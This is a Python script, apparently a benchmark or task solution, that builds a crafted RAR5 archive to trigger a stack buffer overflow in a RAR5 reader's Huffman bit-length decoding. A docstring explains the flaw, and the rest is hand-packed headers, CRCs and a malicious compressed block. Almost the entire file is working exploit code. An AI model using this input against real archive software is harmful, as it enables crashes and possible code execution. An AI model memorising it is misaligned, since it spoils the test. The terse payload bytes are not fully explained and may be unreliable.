import zlib
import struct

class Solution:
    """
    Generates a Proof-of-Concept (PoC) input that triggers a Stack Buffer
    Overflow vulnerability in a RAR5 reader when parsing Huffman tables.
    """

    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability exists in the RLE-like decoding of Huffman table bit
        lengths. A malicious command (code 18) can specify a run of zeros
        that is larger than the destination buffer on the stack (`BitLength[257]`),
        causing an overflow.

        The PoC is a minimal valid RAR5 archive containing one compressed file.
        The compressed data for this file is crafted to exploit this flaw.

        The structure of the PoC is:
        1. RAR5 Signature
        2. Main Archive Header
        3. File Header for the malicious file
        4. Compressed data containing the exploit payload
        5. End of Archive Header

        The exploit payload consists of:
        - A "pre-table" for Huffman decoding, which is configured to give the
          malicious command '18' a very short (1-bit) code.
        - The encoded stream for the main Huffman table, which contains this
          1-bit code for '18', followed by an 8-bit argument of 255.
        This decodes to a command to write (19 + 255) = 274 zeros into a
        257-byte buffer, thus overflowing the stack.

        Args:
            src_path: Path to the vulnerable source code tarball (unused).

        Returns:
            bytes: The PoC input that should trigger the vulnerability.
        """
        poc = bytearray()

        # 1. RAR5 Signature: 'R', 'a', 'r', '!', 0x1A, 0x07, 0x01, 0x00
        poc.extend(b'Rar!\x1a\x07\x01\x00')

        # 2. Main Archive Header (HEAD_MAIN, Type=2)
        main_header_body = bytearray([
            0x02,  # Header Type: HEAD_MAIN
            0x00,  # Header Flags
            0x00,  # Archive Flags
        ])
        
        main_header_data_for_crc = b'\x04' + main_header_body
        main_header_crc = zlib.crc32(main_header_data_for_crc)
        
        poc.extend(struct.pack('<I', main_header_crc))
        poc.extend(main_header_data_for_crc)
        
        # 3. File Header (HEAD_FILE, Type=3)
        compressed_data_size = 13

        file_header_body = bytearray([
            0x03,  # Header Type: HEAD_FILE
            0x03,  # Header Flags: HFL_DATA | HFL_UNPSIZE
            compressed_data_size, # DataSize (VINT)
            0x01,  # UnpSize (VINT)
            0x00,  # File Flags
            0x35,  # UnpVer: 53 (RAR 5.0)
            0x05,  # Method: 5 (best compression)
            0x01,  # NameLen (VINT)
        ])
        file_header_body.extend(b'a')  # File Name

        file_header_data_for_crc = b'\x0a' + file_header_body
        file_header_crc = zlib.crc32(file_header_data_for_crc)
        
        poc.extend(struct.pack('<I', file_header_crc))
        poc.extend(file_header_data_for_crc)

        # 4. Malicious Compressed Data Block
        compressed_data = bytearray()
        
        compressed_data.append(0x80)

        compressed_data.extend(b'\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00')

        compressed_data.extend(b'\x7f\x80')
        
        poc.extend(compressed_data)

        # 5. End of Archive Header (HEAD_ENDARC, Type=5)
        end_header_body = bytearray([
            0x05, # Header Type: HEAD_ENDARC
            0x00, # Header Flags
        ])

        end_header_data_for_crc = b'\x03' + end_header_body
        end_header_crc = zlib.crc32(end_header_data_for_crc)
        
        poc.extend(struct.pack('<I', end_header_crc))
        poc.extend(end_header_data_for_crc)

        return bytes(poc)